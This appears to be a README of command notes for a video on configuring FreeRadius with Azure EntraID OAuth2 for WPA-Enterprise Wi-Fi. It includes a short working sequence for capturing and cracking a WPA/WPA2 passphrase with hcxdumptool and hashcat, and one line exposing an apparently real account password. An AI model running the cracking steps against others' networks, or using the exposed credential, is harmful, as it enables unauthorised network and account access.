# WIFI FreeRadius + Azure EntraID

[Youtube Video](https://youtu.be/80C8dxnPZGM?si=qYxDt7yLPIrFAkyp)

### Purge FreeRadius

```
apt purge freeradius-common freeradius-config freeradius
rm -rf /etc/freeradius
```

### Crack WPA/WPA2 WIFI

```
airodump-ng wlan1 -N test
tcpdump -s 65535 -y IEEE802_11_RADIO "wlan addr3 cc2de03847d4 or wlan addr3 ffffffffffff" -ddd > filter.bpf
hcxdumptool -i wlan1 -c 1a --bpp=filter.bpf -w capture.pcapng
hcxpcapngtool -o capture.hc22000 capture.pcapng
hashcat -m 22000 capture.hc22000 -a3 "?h?h?h?h?h?h?h?h"
```

### FreeRadius Setup

```
lsb_release -a
apt -y install freeradius freeradius-utils eapoltest
systemctl stop freeradius
vi /etc/freeradius/3.0/users
filip   Cleartext-Password := "password"
vi /etc/freeradius/3.0/clients.conf
freeradius -X
tshark -V -ni lo udp port 1812
radtest filip password 127.0.0.1 0 testing123
radtest filip password2 127.0.0.1 0 testing123
radtest filip password 127.0.0.1 0 testing1234
echo -n "password" | openssl dgst -sha256
vi /etc/freeradius/3.0/users
filip2  SHA2-Password := "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8"
freeradius -X
radtest filip2 password 127.0.0.1 0 testing123
```

### EAPOL test

```
vi /etc/freeradius/3.0/mods-enabled/eap
openssl x509 -in /etc/ssl/certs/ssl-cert-snakeoil.pem --text --noout

vi eapol_test.conf
network={
        key_mgmt=WPA-EAP
        eap=TTLS
        identity="filip"
        password="password"
        phase2="auth=PAP"
}

freeradius -X
tshark -V -ni lo udp port 1812
eapol_test -c eapol_test.conf -a 127.0.0.1 -p 1812 -s testing123
```

### Client setup

```
vi /etc/freeradius/3.0/clients.conf

client UNIFI {
    ipaddr = 192.168.10.1
    secret = testing123
}

freeradius -X
```

### OAuth2 FreeRadius

```
vi /etc/freeradius/3.0/users
# comment out users

apt -y install ca-certificates curl libjson-pp-perl libwww-perl
cd /opt
git clone https://github.com/jimdigriz/freeradius-oauth2-perl.git

vi /etc/freeradius/3.0/proxy.conf
realm XXX.onmicrosoft.com {
    oauth2 {
        discovery = "https://login.microsoftonline.com/%{Realm}/v2.0"
        client_id = "CLIENT_ID_GOES_HERE"
        client_secret = "CLIENT_SECRET_GOES_HERE"
        cache_password = yes
    }
}

printf '\n$INCLUDE /opt/freeradius-oauth2-perl/dictionary\n' >> /etc/freeradius/3.0/dictionary
ln -s /opt/freeradius-oauth2-perl/module /etc/freeradius/3.0/mods-enabled/oauth2
ln -s /opt/freeradius-oauth2-perl/policy /etc/freeradius/3.0/policy.d/oauth2
vi /etc/freeradius/3.0/sites-enabled/default
# authorize section add oauth2 after ldap
# end of the authenticate
Auth-Type oauth2 {
        oauth2
}
# post-auth section add oauth2 after ldap

vi /etc/freeradius/3.0/sites-enabled/inner-tunnel
# authorize section add oauth2 after ldap
# end of the authenticate
Auth-Type oauth2 {
        oauth2
}
# post-auth section add oauth2 after ldap

freeradius -X
radtest filip@lebieckigmail.onmicrosoft.com 3ag683Ig 127.0.0.1 0 testing123
cp eapol_test.conf eapol_test2.conf

vi eapol_test2.conf
network={
        key_mgmt=WPA-EAP
        eap=TTLS
        identity="filip@XXX.onmicrosoft.com"
        password="USER_PASS_GOES_HERE"
        phase2="auth=PAP"
}

eapol_test -c eapol_test2.conf -a 127.0.0.1 -p 1812 -s testing123
```
